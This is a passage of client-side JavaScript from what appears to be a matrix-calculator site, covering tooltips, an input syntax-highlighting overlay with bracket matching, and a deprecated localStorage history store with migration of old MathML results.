        if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
            event.preventDefault();
            showTooltip(undefined);
        }
    };

    var showTooltip = function(element) {
        if (keyDownTarget != undefined) {
            keyDownTarget.removeEventListener("keydown", onKeyDown, false);
            //TODO: should this attribute always point to the description (?)
            keyDownTarget.removeAttribute("aria-describedby");
            keyDownTarget = undefined;
        }
        if (tooltip == null) {
            tooltip = document.createElement("div");
            tooltip.id = "highlight-tooltip";
            tooltip.setAttribute("role", "tooltip");
            tooltip.classList.toggle("tooltip-dialog", true);
        }
        if (tooltip.getAttribute("open") != undefined && element == undefined) {
            tooltip.removeAttribute("open");
        }
        if (element != undefined) {
            var tooltipContainer = element;
            var tooltipId = element.getAttribute("data-tooltip"); //TODO: remove
            if (tooltipId != undefined) {
                tooltipContainer = document.getElementById(tooltipId);
            }
            keyDownTarget = document.getElementById(element.getAttribute("data-for"));
            var rect = keyDownTarget.getBoundingClientRect();
            keyDownTarget.setAttribute("aria-describedby", tooltip.id);
            keyDownTarget.addEventListener("keydown", onKeyDown, false);
            if (tooltip.parentNode == undefined) {
                document.body.appendChild(tooltip);
            }
            tooltip.textContent = "";
            var c = tooltipContainer.cloneNode(true);
            while (c.firstChild != undefined) {
                tooltip.appendChild(c.firstChild);
            }
            //tooltip.style.transform = "scale(1)";
            tooltip.style.visibility = "hidden";
            var display = tooltip.style.display;
            tooltip.style.display = "block";
            tooltip.style.position = "absolute";
            tooltip.style.right = "auto"; // Chrome 49 with html[dir="rtl"] uses 0px from right
            tooltip.style.top = (window.pageYOffset + rect.top - tooltip.offsetHeight - 8.5) + 'px';
            tooltip.style.left = (window.pageXOffset + (rect.left + rect.right) / 2 - tooltip.offsetWidth / 2) + "px";
            tooltip.style.bottom = "auto";
            tooltip.style.display = display;
            tooltip.style.visibility = "";
            //tooltip.style.transform = "";
            if (tooltip.getAttribute("open") == undefined) {
                tooltip.setAttribute("open", "open"); // "show" moves the focus in Chrome
            }
        }
    };

    var f = function(highlight) {

        var hoveredElements = [];
        var focusedElements = [];

        return function(element) {
            var x = document.getElementById(element.getAttribute("data-for"));

            //!
            // The idea is to set tabindex="0" only for cells which have a tooltip or a "highlight"
            x.setAttribute("tabindex", "0");
            var tagName = x.tagName.toLowerCase();
            if (tagName === 'mrow' || tagName === 'mtd') {
                if (x.tabIndex == null) {
                    x.setAttribute("href", "#");
                }
            } else {
                if (tagName !== 'a') {
                    throw new RangeError(tagName);
                }
            }
            //!

            var highlightInternal = function() {
                window.setTimeout(function() {
                    highlight(hoveredElements.length !== 0 ? hoveredElements[hoveredElements.length - 1] : (focusedElements.length !== 0 ? focusedElements[focusedElements.length - 1] : undefined));
                }, 0);
            };

            x.addEventListener("mouseenter", function(event) {
                hoveredElements.push(element);
                highlightInternal();
            }, false);
            x.addEventListener("mouseleave", function(event) {
                hoveredElements.pop();
                highlightInternal();
            }, false);
            x.addEventListener("focus", function(event) {
                focusedElements.push(element);
                highlightInternal();
            }, false);
            x.addEventListener("blur", function(event) {
                focusedElements.pop();
                highlightInternal();
            }, false);
        };

    };

    globalThis.initializeAHighlight = f(highlight);
    globalThis.initializeATooltip = f(showTooltip);

}());

/*global window, document, console, Node, Event*/

//TODO: optimize

(function() {
    "use strict";


    var selectionChangeEventSupport = undefined;
    var isSelectionChangeEventSupported = function(node) {
        if (!('onselectionchange' in document)) {
            return false;
        }
        if (node.hasAttribute('contenteditable')) {
            return true;
        }
        if (selectionChangeEventSupport == null) {
            var div = document.createElement('div');
            var input = document.createElement('input');
            div.appendChild(input);
            document.body.appendChild(div);
            input.value = 'x';
            input.select();
            var selection = window.getSelection();
            selectionChangeEventSupport = selection.anchorOffset === selection.focusOffset && selection.anchorNode === div && selection.focusNode === div;
            div.parentNode.removeChild(div);
        }
        return selectionChangeEventSupport;
    };

    var queue = [];
    var initializeAInput = function(container) {
        var input = container.firstElementChild;
        if (input.tagName.toLowerCase() !== 'input' && input.tagName.toLowerCase() !== 'textarea' && !input.hasAttribute('contenteditable')) {
            throw new TypeError();
        }
        var idPrefix = input.id + '=';

        // see https://github.com/kueblc/LDT

        var inputStyle = window.getComputedStyle(input, undefined);

        // FF does not like font
        var fontSize = inputStyle.fontSize;
        var fontFamily = inputStyle.fontFamily;
        var fontWeight = inputStyle.fontWeight;
        var lineHeight = inputStyle.lineHeight;
        var textAlign = inputStyle.textAlign;

        var marginLeft = Number.parseFloat(inputStyle.marginLeft);
        var marginTop = Number.parseFloat(inputStyle.marginTop);
        var marginRight = Number.parseFloat(inputStyle.marginRight);
        var marginBottom = Number.parseFloat(inputStyle.marginBottom);
        var paddingLeft = Number.parseFloat(inputStyle.paddingLeft);
        var paddingTop = Number.parseFloat(inputStyle.paddingTop);
        var paddingRight = Number.parseFloat(inputStyle.paddingRight);
        var paddingBottom = Number.parseFloat(inputStyle.paddingBottom);

        // when the width of a textarea is small, paddingRight will not be included in scrolling area,
        // but this is not true for an input, in Firefox - for both
        // see https://developer.mozilla.org/en-US/docs/Mozilla/Gecko/Chrome/CSS/overflow-clip-box
        if (input.tagName.toLowerCase() === "input") {
            // Firefox, Edge, Chrome
            marginLeft += paddingLeft;
            marginTop += paddingTop;
            marginRight += paddingRight;
            marginBottom += paddingBottom;
            paddingLeft = 0;
            paddingTop = 0;
            paddingRight = 0;
            paddingBottom = 0;
        } else {
            if (paddingRight !== 0 || paddingBottom !== 0) {
                console.warn("Set paddingRight and paddingBottom to zero for <textarea> elements");
            }
        }

        var backgroundElement = document.createElement("div");
        backgroundElement.style.fontSize = fontSize;
        backgroundElement.style.fontFamily = fontFamily;
        backgroundElement.style.fontWeight = fontWeight;
        backgroundElement.style.lineHeight = lineHeight;
        backgroundElement.style.textAlign = textAlign;
        backgroundElement.style.paddingLeft = paddingLeft + "px";
        backgroundElement.style.paddingTop = paddingTop + "px";
        backgroundElement.style.paddingRight = paddingRight + "px";
        backgroundElement.style.paddingBottom = paddingBottom + "px";
        backgroundElement.setAttribute('translate', 'no'); // for Google Translate
        backgroundElement.setAttribute('inert', 'inert');
        if (queue.length === 0) {
            window.requestAnimationFrame(function() {
                for (var i = 0; i < queue.length; i += 1) {
                    queue[i]();
                }
                queue.length = 0;
            });
        }
        queue.push(function() { // relayout
            input.parentNode.insertBefore(backgroundElement, input);
        });

        var updateTokenNode = function(span, text, tokenClassName, className) {
            var classList = span.classList;
            for (var i = 0; i < classList.length; i += 1) {
                if (classList[i] !== tokenClassName && classList[i] !== className) {
                    classList.toggle(classList[i], false);
                }
            }
            if (tokenClassName != null) {
                span.classList.toggle(tokenClassName, true);
            }
            if (className != null) {
                span.classList.toggle(className, true);
            }
            if (span.firstChild == null || text === "") {
                throw new TypeError("Something happens with undo/redo history in Chrome when text node is added/removed.");
            }
            if (span.firstChild.data !== text) {
                span.firstChild.data = text; //Note: on the TextNode
            }
        };

        var add = function(text, tokenClassName, className, div) {
            var span = document.createElement("span");
            span.textContent = " ";
            updateTokenNode(span, text, tokenClassName, className);
            div.appendChild(span);
        };

        var getBracketMarks = function(value, inputSelectionStart) {
            if (inputSelectionStart == null) {
                return {
                    first: undefined,
                    second: undefined
                };
            }
            var selectionStart = Math.max(inputSelectionStart - 1, 0);
            var c = 0;
            var step = 0;
            var pair = 0;
            while (step === 0 && selectionStart < Math.min(inputSelectionStart + 1, value.length)) {
                c = value.charCodeAt(selectionStart);
                var brackets = "()[]{}〖〗（）";
                for (var k = 0; k < brackets.length; k += 2) {
                    if (c === brackets.charCodeAt(k)) {
                        pair = brackets.charCodeAt(k + 1);
                        step = +1;
                    }
                    if (c === brackets.charCodeAt(k + 1)) {
                        pair = brackets.charCodeAt(k);
                        step = -1;
                    }
                }
                selectionStart += 1;
            }
            selectionStart -= 1;
            if (step !== 0) {
                var i = selectionStart;
                var depth = 1;
                i += step;
                while (i >= 0 && i < value.length && depth > 0) {
                    var code = value.charCodeAt(i);
                    if (code === c) {
                        depth += 1;
                    }
                    if (code === pair) {
                        depth -= 1;
                    }
                    i += step;
                }
                i -= step;
                if (depth === 0) {
                    return {
                        first: {
                            start: selectionStart,
                            end: selectionStart + 1,
                            className: "bracket-mark"
                        },
                        second: {
                            start: i,
                            end: i + 1,
                            className: "bracket-mark"
                        }
                    };
                } else {
                    return {
                        first: {
                            start: selectionStart,
                            end: selectionStart + 1,
                            className: "odd-bracket-mark"
                        },
                        second: undefined
                    };
                }
            }
            return {
                first: undefined,
                second: undefined
            };
        };

        // TODO: to polyfills (?)
        var getClientLeft = function(input) {
            // ! Element#clientLeft and Element#clientTop are rounded to integer
            return input.tagName.toLowerCase() === "input" ? Number.parseFloat(inputStyle.borderLeftWidth) : input.clientLeft;
        };
        var getClientTop = function(input) {
            // ! Element#clientLeft and Element#clientTop are rounded to integer
            return input.tagName.toLowerCase() === "input" ? Number.parseFloat(inputStyle.borderTopWidth) : input.clientTop;
        };

        var updateMargins = function() {
            var clientLeft = getClientLeft(input);
            var clientTop = getClientTop(input);
            //var inputRect = input.getBoundingClientRect();
            var clientRight = input.offsetWidth - input.clientWidth - clientLeft;
            var clientBottom = input.offsetHeight - input.clientHeight - clientTop;

            backgroundElement.style.marginLeft = (clientLeft + marginLeft).toString() + "px";
            backgroundElement.style.marginTop = (clientTop + marginTop).toString() + "px";
            backgroundElement.style.marginRight = (clientRight + marginRight).toString() + "px";
            backgroundElement.style.marginBottom = (clientBottom + marginBottom).toString() + "px";
        };

        var updateDirectionality = function() {
            var dir = input.getAttribute('dir') || 'ltr';
            if (backgroundElement.getAttribute('dir') !== dir) { // avoid layout invalidation in Chrome
                backgroundElement.setAttribute('dir', dir);
            }
        };

        // TODO: start, end, insertion
        var updateLine = function(line, marks, lineNode) {
            //lineNode.textContent = '';
            var tokenNode = lineNode.firstElementChild;
            var tokenizer = new Tokenizer(line, 0, null);
            var token = null;
            var position = 0;
            while ((token = tokenizer.next()).type !== 'EOF') {
                var className = null;
                for (var i = 0; i < marks.length; i += 1) {
                    var m = marks[i];
                    if (m.start >= position && m.end <= tokenizer.position) {
                        className = m.className;
                    }
                }
                if (tokenNode == null) {
                    tokenNode = document.createElement('span');
                    tokenNode.textContent = ' ';
                    lineNode.appendChild(tokenNode);
                }
                //TODO: move ?
                var type = token.type === 'symbol' && /^pi|[eiEIUnkXY]$/.test(token.value) ? 'special-symbol' : token.type;
                var tokenText = line.slice(position, tokenizer.position); // token.value contains replaced characters and even the token.value can have a different length
                updateTokenNode(tokenNode, tokenText, type, className);
                position = tokenizer.position;
                tokenNode = tokenNode.nextElementSibling;
            }
            while (tokenNode != null) {
                var next = tokenNode.nextElementSibling;
                tokenNode.parentNode.removeChild(tokenNode);
                tokenNode = next;
            }
            //TODO: EOF?

            /*
                var start = 0;
                var end = line.length;

                for (var i = 0; i < marks.length; i += 1) {
                  var m = marks[i];
                  var s = m.start > start ? m.start : start;
                  var e = m.end < end ? m.end : end;
                  if (s < e) {
                    add(line.slice(start, s), null, null, lineNode);
                    add(line.slice(s, e), null, m.className, lineNode);
                    start = e;
                  }
                }
                if (start < end) {
                  add(line.slice(start, end), null, null, lineNode);
                  start = end;
                }
            */
            if (input.getAttribute("list") != undefined && textAlign !== 'center') {
                add("  ", null, null, lineNode); // to increase scrollWidth in Chrome
            }
        };

        var map = {};
        var idCounter = -1;

        var getCursorPosition = function(input) {
            try {
                return input.selectionDirection !== 'forward' ? input.selectionStart : input.selectionEnd;
            } catch (error) {
                // input.type === 'number' on some browsers
                // Firefox 3.6.28 throws when trying to get selectionStart/selectionEnd on invisible element (textarea/input)
                // Not sure if it is fast to check visibility using "input.getBoundingClientRect().left === 0".
                console.error(error);
                return null;
            }
        };

        var getCursorSecondPosition = function(input) {
            try {
                return input.selectionDirection === 'forward' ? input.selectionStart : input.selectionEnd;
            } catch (error) {
                // input.type === 'number' on some browsers
                console.error(error);
                return null;
            }
        };

        var update = function(event) {
            var value = input.value;
            var marks = [];
            var tmp0 = getBracketMarks(value, getCursorPosition(input));
            if (tmp0.first != undefined) {
                marks.push(tmp0.first);
            }
            if (tmp0.second != undefined) {
                marks.push(tmp0.second);
            }
            var error = input.getAttribute("data-error");
            if (error != undefined) {
                marks.push({
                    start: Number(error.split(",")[0]),
                    end: Number(error.split(",")[1]),
                    className: "error-mark"
                });
            }
            marks.sort(function(a, b) {
                return a.start < b.start ? -1 : (b.start < a.start ? +1 : 0);
            });

            //var scrollLeft = input.scrollLeft;
            //var scrollTop = input.scrollTop;
            updateMargins();
            updateDirectionality();

            var lines = value.split('\n');
            var start = 0;
            var node = backgroundElement.firstElementChild;
            for (var j = 0; j < lines.length; j += 1) {
                if (node == null) {
                    node = document.createElement("div");
                    node.id = idPrefix + (++idCounter);
                    map[node.id] = {
                        line: null,
                        lineMarks: null
                    };
                    backgroundElement.appendChild(node);
                }
                var div = node;
                var line = lines[j];
                var lineMarks = [];
                for (var i = 0; i < marks.length; i += 1) {
                    var m = marks[i];
                    var s = Math.max(m.start - start, 0);
                    var e = Math.min(m.end - start, line.length + '\n'.length);
                    if (s < e) {
                        lineMarks.push({
                            start: s,
                            end: e,
                            className: m.className
                        });
                    }
                }
                var data = map[div.id];
                if (line !== data.line || JSON.stringify(lineMarks) !== JSON.stringify(data.lineMarks)) {
                    //Note: empty lines are collapsed
                    //Note: extra whitespace/newline may work not well with text-align inequal to 'start'
                    updateLine(line || ' ', lineMarks, div);
                    data.line = line;
                    data.lineMarks = lineMarks;
                }
                start += line.length + '\n'.length;
                node = node.nextElementSibling;
            }
            while (node != undefined) {
                var next = node.nextElementSibling;
                delete map[node.id];
                node.parentNode.removeChild(node);
                node = next;
            }

            //window.requestAnimationFrame(function () {//?
            // avoid strange style recalcuation which stops the smooth scrolling animation (element.scrollIntoViewIfNeeded(false))
            //if (backgroundElement.scrollLeft !== scrollLeft) {
            //  backgroundElement.scrollLeft = scrollLeft;
            //}
            //if (backgroundElement.scrollTop !== scrollTop) {
            //  backgroundElement.scrollTop = scrollTop;
            //}
            //});
        };

        var updateMarks = function() {
            update(undefined);
        };

        var wasSelected = false;
        // if selection contains exactly one token and it is not a punctuation or operator select all other similar tokens
        var updateSelectionMatches = function(start, end) {
            if (start > end) {
                var tmp = start;
                start = end;
                end = tmp;
            }
            if (end - start >= 1 || wasSelected) {
                var selectedToken = null;
                var lineNode = backgroundElement.firstElementChild;
                var lineStart = 0;
                while (lineNode != null) {
                    var data = map[lineNode.id];
                    var line = data.line;
                    var s = Math.min(start - lineStart, line.length);
                    var e = Math.min(end - lineStart, line.length);
                    if (s < e) {
                        var tokenNode = lineNode.firstElementChild;
                        while (tokenNode != null) {
                            var n = tokenNode.firstChild.data.length;
                            if (s === 0 && e === n) {
                                selectedToken = tokenNode;
                            }
                            s -= n;
                            e -= n;
                            tokenNode = tokenNode.nextElementSibling;
                        }
                    }
                    lineStart += line.length + '\n'.length;
                    lineNode = lineNode.nextElementSibling;
                }
                if (wasSelected || selectedToken != null) {
                    var selectionText = selectedToken != null && (selectedToken.classList.contains('symbol') || selectedToken.classList.contains('special-symbol')) ? selectedToken.firstChild.data : null;
                    var lineNode = backgroundElement.firstElementChild;
                    while (lineNode != null) {
                        var tokenNode = lineNode.firstElementChild;
                        while (tokenNode != null) {
                            var ok = tokenNode.firstChild.data === selectionText;
                            tokenNode.classList.toggle("selectionMatches", ok);
                            wasSelected = wasSelected || ok;
                            tokenNode = tokenNode.nextElementSibling;
                        }
                        lineNode = lineNode.nextElementSibling;
                    }
                }
            }
        };

        var oldCursorPosition = null;
        var oldCursorSecondPosition = null;
        var ticking = false;
        var checkSelectionChange = function(event) {
            if (!ticking) {
                ticking = true;
                window.requestAnimationFrame(function() { // selectionStart is not changed yet for mousedown event
                    ticking = false;
                    var newCursorPosition = getCursorPosition(input);
                    var newCursorSecondPosition = getCursorSecondPosition(input);
                    var flag = oldCursorPosition !== newCursorPosition;
                    if (flag) {
                        oldCursorPosition = newCursorPosition;
                        updateMarks();
                    }
                    if (flag || oldCursorSecondPosition !== newCursorSecondPosition) {
                        oldCursorSecondPosition = newCursorSecondPosition;
                        updateSelectionMatches(newCursorPosition, newCursorSecondPosition);
                    }
                });
            }
        };
        // https://github.com/w3c/selection-api/issues/53
        // selectionchange
        input.addEventListener("a-input.selectionchange", checkSelectionChange, false);

        var listenForSelectionChangeOrScroll = function(f) {
            // wheel : Shift + mousewheel
            // dragover : https://stackoverflow.com/questions/27713057/event-to-detect-when-the-text-in-an-input-is-scrolled
            var events = ['keydown', 'keyup', 'mousedown', 'mouseup', 'mousemove', 'touchmove', 'input', 'focus', 'blur', 'wheel', 'dragover'];
            for (var i = 0; i < events.length; i += 1) {
                input.addEventListener(events[i], f, events[i] === 'wheel' || events[i] === 'touchmove' ? {
                    passive: true
                } : false);
            }
        };

        // UPDATE: https://bugs.chromium.org/p/chromium/issues/detail?id=1327098&q=selectionchange&can=2
        // new selectionchange should be fired at <input>
        // TODO: !?

        if (!isSelectionChangeEventSupported(input)) {
            listenForSelectionChangeOrScroll(checkSelectionChange);
        }

        input.addEventListener("input", update, false);
        input.addEventListener("update-attribute", function(event) {
            updateMarks();
        }, false);
        var scrollUpdateTicking = false;
        var onScroll = function(event) {
            if (!scrollUpdateTicking) {
                scrollUpdateTicking = true;
                window.requestAnimationFrame(function() {
                    scrollUpdateTicking = false;
                    var scrollLeft = input.scrollLeft;
                    var scrollTop = input.scrollTop;
                    backgroundElement.scrollLeft = scrollLeft;
                    backgroundElement.scrollTop = scrollTop;
                });
            }
        };

        input.addEventListener("scroll", onScroll, false);
        input.addEventListener("a-input.selectionchange", onScroll, false); //TODO: remove (?)

        container.classList.toggle('enabled', document.hasFocus() && container.querySelector('input[type="number"]') == null); //!
        container.classList.toggle('focus-within', document.activeElement === input);
        //container.setAttribute('lang', ''); - cause relayout in Chrome? - moved to outer function
        var supports = true;
        try {
            //TODO: use CSS.supports('selector(:focus-within)') instead
            document.body.matches(':focus-within');
        } catch (error) {
            supports = false;
        }
        if (!supports) {
            input.addEventListener("focus", function(event) {
                container.classList.toggle('focus-within', true);
            }, false);
            input.addEventListener("blur", function(event) {
                container.classList.toggle('focus-within', false);
            }, false);
        }

        update(undefined);
    };

    window.initializeAInput = initializeAInput;

    // document.hasFocus is not a function in Opera Mini
    //TODO: this is too slow as style is recalculated on all elements:

    if (typeof document.hasFocus !== 'function') { //TODO: ?
        document.hasFocus = function() {
            return true;
        };
    }

    var onFocusOrBlur = function(event) {
        var hasFocus = document.hasFocus();
        //document.documentElement.classList.toggle('focus-within', hasFocus);
        var es = document.getElementsByClassName('a-input');
        for (var i = 0; i < es.length; i += 1) {
            es[i].classList.toggle('enabled', hasFocus && es[i].querySelector('input[type="number"]') == null);
        }
    };

    //document.documentElement.classList.toggle('focus-within', document.hasFocus != null ? document.hasFocus() : true);
    window.addEventListener("focus", onFocusOrBlur, false);
    window.addEventListener("blur", onFocusOrBlur, false);

    var lastSelection = {
        anchorNode: null,
        focusNode: null
    };
    var fire = function(node) {
        if (node != null) {
            if (node.nodeType === Node.TEXT_NODE) {
                node = node.parentNode;
            }
            if (node != null) {
                node.dispatchEvent(new Event('a-input.selectionchange'));
            }
        }
    };
    var f = function(a, b) {
        if (a !== b) {
            fire(a);
            fire(b);
        } else {
            fire(a);
        }
    };
    var getContainer = function(container, offset) {
        if (container == null) {
            return null;
        }
        var c = container.firstChild;
        var i = 0;
        while (c != null && i < offset) {
            i += 1;
            c = c.nextSibling;
        }
        if (c != null && c.nodeType === Node.ELEMENT_NODE && (c.tagName.toLowerCase() === 'input' || c.tagName.toLowerCase() === 'textarea')) {
            return c;
        }
        return container;
    };
    document.addEventListener('selectionchange', function(event) {
        var selection = window.getSelection();
        var anchorNode = getContainer(selection.anchorNode, selection.anchorOffset);
        var focusNode = getContainer(selection.focusNode, selection.focusOffset);
        if (lastSelection.anchorNode === lastSelection.focusNode && anchorNode === focusNode) {
            f(lastSelection.anchorNode, anchorNode);
        } else {
            f(lastSelection.anchorNode, anchorNode);
            f(lastSelection.focusNode, focusNode);
        }
        lastSelection.anchorNode = anchorNode;
        lastSelection.focusNode = focusNode;
    }, false);

}());

/*global window, document, unescape, hit, Node */

// deprecated

(function() {
    "use strict";

    function ItemsStorage(keyStorage) {
        this.keyStorage = keyStorage;
    }
    ItemsStorage.prototype._save = function(items) {
        var data = Array.from(items).filter(function(x) {
            return x != undefined;
        });
        var keyStorage = this.keyStorage;
        var save = function(limit) {
            data = data.slice(Math.max(0, data.length - limit));
            var valueToSave = JSON.stringify(data);
            keyStorage.setItem("resdiv", valueToSave);
            var value = keyStorage.getItem("resdiv");
            if (value !== valueToSave && limit > 1 && valueToSave.length > 4 * 1024) {
                return save(Math.floor(limit / 2));
            }
            return undefined;
        };
        return save(data.length);
    };
    ItemsStorage.prototype._load = function() {
        var parseJSONArraySafely = function(value) {
            try {
                // old data ?
                var result = JSON.parse(value);
                if (result instanceof Array) {
                    return result;
                }
            } catch (error) {
                console.error(error);
            }
            return [];
        };
        var value = this.keyStorage.getItem("resdiv") || "[]";
        var items = parseJSONArraySafely(value);

        try {
            var m = /(?:^|;)\s*lastResult\s*\=\s*([^;]*)/.exec(document.cookie);
            if (m != undefined) {
                var lastResult = unescape(m[1]);
                if (lastResult !== "") {
                    window.setTimeout(function() {
                        hit({
                            bc: "cookie"
                        });
                    }, 0);
                    items.unshift([lastResult]);
                    var valueToSave = JSON.stringify(items);
                    this.keyStorage.setItem("resdiv", valueToSave);
                    if (this.keyStorage.getItem("resdiv") === valueToSave) {
                        document.cookie = "lastResult=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
                    }
                }
            }
        } catch (error) {
            window.setTimeout(function() {
                throw error;
            }, 0);
        }

        var currentNumber = 0;
        for (var i = 0; i < items.length; i += 1) {
            items[i] = ItemsStorage.updateVersion0(items[i], currentNumber + 1);
            currentNumber = Math.max(currentNumber, items[i].actHistoryId);
        }
        return {
            items: items,
            currentNumber: currentNumber
        };
    };
    ItemsStorage.prototype.getAllEntries = function(callback) {
        var tmp = this._load();
        var items = tmp.items;
        var keys = items.map(function(item) {
            return item.actHistoryId;
        });
        callback({
            keys: keys,
            items: items
        });
    };
    ItemsStorage.prototype.add = function(item, callback) {
        var tmp = this._load();
        var items = tmp.items;
        var currentNumber = tmp.currentNumber;
        var key = currentNumber + 1;
        item.actHistoryId = key;
        items.push(item);
        this._save(items);
        callback(key);
    };
    ItemsStorage.prototype["delete"] = function(key) {
        var tmp = this._load();
        var items = tmp.items;
        for (var i = 0; i < items.length; i += 1) {
            var x = items[i];
            if (x != undefined && x.actHistoryId === key) {
                items[i] = undefined;
            }
        }
        this._save(items);
    };
    ItemsStorage.prototype.clear = function() {
        this._save([]);
    };


    ItemsStorage.updateVersion0 = function(data, idIfNotSet) {
        var oldVersion = data.version || 0;
        if (oldVersion === 0) {
            data = Array.from(data);
            while (data.length < 6) {
                data.push(undefined);
            }
            // emptry strings are needed for `zInsAct`
            var resultHTML = data[0] || "";
            if (resultHTML.indexOf("</custom-math>") === -1 && resultHTML.indexOf("</math>") === -1) {
                resultHTML = "<div class=\"math\">" + resultHTML + "</div>";
            }
            var resultMatrix = data[1] || "";
            data = {
                resultHTML: resultHTML,
                resultMatrix: resultMatrix,
                details: data[2],
                expressionString: data[3],
                actHistoryId: data[4] != undefined ? Number(data[4]) : idIfNotSet,
                detailsHTML: data[5],
                version: 7
            };
        }
        return data;
    };

    ItemsStorage.updateItem = function(data) {

        var oldVersion = data.version || 0;

        data = ItemsStorage.updateVersion0(data);

        if (oldVersion <= 7) {
            if (data.resultMatrix != undefined && data.resultMatrix.indexOf(";") !== -1) {
                // "-17/3\t 4\t 4/3;  8/3\t-2\t-1/3;   -2\t 1\t   1"
                data.resultMatrix = "{{" + data.resultMatrix.replace(/\s*;\s*/g, "},{").replace(/\t/g, ",").replace(/\x20/g, "") + "}}";
                hit({
                    bc: "resultMatrix"
                }); //!
            }
        }

        if (data.resultMatrix === '') {
            var tmp = /onclick\="\(new Matrix\('str',\d+,(\d+)(?:,\d+)?,([\-0-9\/',]+)\)\).print\('a'\);">/.exec(data.resultHTML);
            if (tmp != null) {
                var colsNumber = Number(tmp[1]);
                var rows = [];
                var x = tmp[2].replace(/'/g, '').split(',');
                while (x.length !== 0) {
                    rows.push('{' + x.slice(0, colsNumber).join(',') + '}');
                    x = x.slice(colsNumber);
                }
                data.resultMatrix = '{' + rows.join(',') + '}';
            }
        }

        if (true) {
            var removeInsertButtons = function(e) {
                var spans = e.querySelectorAll('span');
                for (var i = 0; i < spans.length; i += 1) {
                    var span = spans[i];
                    if (span.style != null && span.style.cssFloat === 'right') {
                        span.parentNode.removeChild(span);
                    }
                }
            };
            var removeCustomMath = function(e) {
                var elements = e.querySelectorAll('custom-math');
                for (var i = 0; i < elements.length; i += 1) {
                    var x = elements[i];
                    var math = document.createElement('math');
                    math.innerHTML = x.innerHTML;
                    x.parentNode.insertBefore(math, x);
                    x.parentNode.removeChild(x);
                }
            };
            var removeMathClass = function(e) {
                var elements = e.querySelectorAll('.math');
                for (var i = 0; i < elements.length; i += 1) {
                    var x = elements[i];
                    if (x.firstChild === x.lastChild && x.firstElementChild != null && x.firstElementChild.tagName.toLowerCase() === 'math') {
                        x.parentNode.insertBefore(x.firstChild, x);
                        x.parentNode.removeChild(x);
                    } else {
                        while (x.firstChild != null) {
                            x.parentNode.insertBefore(x.firstChild, x);
                        }
                        x.parentNode.removeChild(x);
                    }
                }

                var es = e.querySelectorAll('span');
                for (var i = 0; i < es.length; i += 1) {
                    var x = es[i];
                    while (x != null && x.tagName.toLowerCase() !== 'math') {
                        x = x.parentNode;
                    }
                    if (x != null) {
                        while (x.firstChild != null) {
                            x.parentNode.insertBefore(x.firstChild, x);
                        }
                        x.parentNode.removeChild(x);
                    }
                }

                // add <math></math>
                var visit = function(x) {
                    if (x.nodeType === Node.ELEMENT_NODE && x.tagName.toLowerCase().slice(0, 1) === 'm') {
                        if (x.tagName.toLowerCase() !== 'math') {
                            if (x.previousSibling != null && x.previousSibling.nodeType === Node.ELEMENT_NODE && x.previousElementSibling.tagName.toLowerCase() === 'math') {
                                x.previousElementSibling.appendChild(x);
                            } else {
                                var math = document.createElement('math');
                                x.parentNode.insertBefore(math, x);
                                x.parentNode.removeChild(x);
                                math.appendChild(x);
                            }
                        }
                    } else {
                        var c = x.firstChild;
                        while (c != null) {
                            var next = c.nextSibling;
                            visit(c);
                            c = next;
                        }
                    }
                };
                visit(e);
            };
            var removeExtraMrows = function(e) {
                var es = e.querySelectorAll('mrow');
                for (var i = 0; i < es.length; i += 1) {
                    var x = es[i];
                    if (x.firstChild === x.lastChild && x.firstChild != null && x.attributes.length === 0) {
                        x.parentNode.insertBefore(x.firstChild, x);
                        x.parentNode.removeChild(x);
                    }
                }
            };
            var addRowspacing = function(e) {
                var es = e.querySelectorAll('mtable');
                for (var i = 0; i < es.length; i += 1) {
                    var x = es[i];
                    if (x.getAttribute('rowspacing') == null) {
                        x.setAttribute('rowspacing', '0ex');
                    }
                }
            };
            var addMROWs = function(e) {
                var c = e.firstElementChild;
                while (c != undefined) {
                    var next = c.nextElementSibling;
                    if (c.tagName.toLowerCase() !== 'mrow') {
                        hit({
                            bc: "msub+msup"
                        }); //!
                        var mrow = document.createElement("mrow");
                        c.parentNode.insertBefore(mrow, c);
                        c.parentNode.removeChild(c);
                        mrow.appendChild(c);
                    }
                    c = next;
                }
            };
            var fixSummary = function(e) {
                var elements = e.querySelectorAll(".summary");
                for (var i = 0; i < elements.length; i += 1) {
                    var oldSummary = elements[i];
                    if (oldSummary != undefined && oldSummary.tagName.toLowerCase() !== "summary") { // backward compatibility
                        hit({
                            bc: ".summary"
                        }); //!
                        var newSummary = document.createElement("summary");
                        while (oldSummary.firstChild != undefined) {
                            newSummary.appendChild(oldSummary.firstChild);
                        }
                        oldSummary.parentNode.insertBefore(newSummary, oldSummary);
                        oldSummary.parentNode.removeChild(oldSummary);
                    }
                }
            };
            var fixMSUBAndMSUP = function(node) {
                // MFENCED - ?
                if (" mfrac msqrt mroot msub msup munder ".indexOf(" " + node.tagName.toLowerCase() + " ") !== -1) {
                    addMROWs(node);
                }
                var c = node.firstElementChild;
                while (c != undefined) {
                    fixMSUBAndMSUP(c);
                    c = c.nextElementSibling;
                }
            };
            var fixDetails = function(e) {
                var elements = e.querySelectorAll(".details");
                for (var i = 0; i < elements.length; i += 1) {
                    var oldDetails = elements[i];
                    hit({
                        bc: ".details"
                    }); //!
                    var container = document.createElement("div");
                    container.classList.toggle("details-container", true);
                    oldDetails.parentNode.insertBefore(container, oldDetails);
                    oldDetails.parentNode.removeChild(oldDetails);
                    oldDetails.classList.toggle("details", false);
                    container.appendChild(oldDetails);
                }
            };
            var fixDetailsContainer = function(e) {
                var elements = e.querySelectorAll(".details-container");
                for (var i = 0; i < elements.length; i += 1) {
                    var old = elements[i];
                    var c = old.firstElementChild;
                    if (c.classList.contains("details-container")) {
                        hit({
                            bc: ".details-container"
                        }); //!
                        c.parentNode.removeChild(c);
                        old.parentNode.insertBefore(c, old);
                        old.parentNode.removeChild(old);
                    }
                }
            };
            var fixOldDetailsTypes = function(e) {
                var elements = e.querySelectorAll("[data-details]");
                for (var i = 0; i < elements.length; i += 1) {
                    var element = elements[i];
                    var detailsAttribute = element.getAttribute("data-details");
                    var x = JSON.parse(detailsAttribute);
                    if (x instanceof Array) {
                        hit({
                            bc: 'detailsarray'
                        });
                        if (x.length !== 1) {
                            throw new TypeError(x.length); //!
                        }
                        x = x[0];
                    }
                    var type = x.type;
                    if (type === "determinant" || type === "inverse" || type === "rank") {
                        hit({
                            bc: "details-" + type
                        }); //!
                        x.type = type + "-Gauss";
                    }
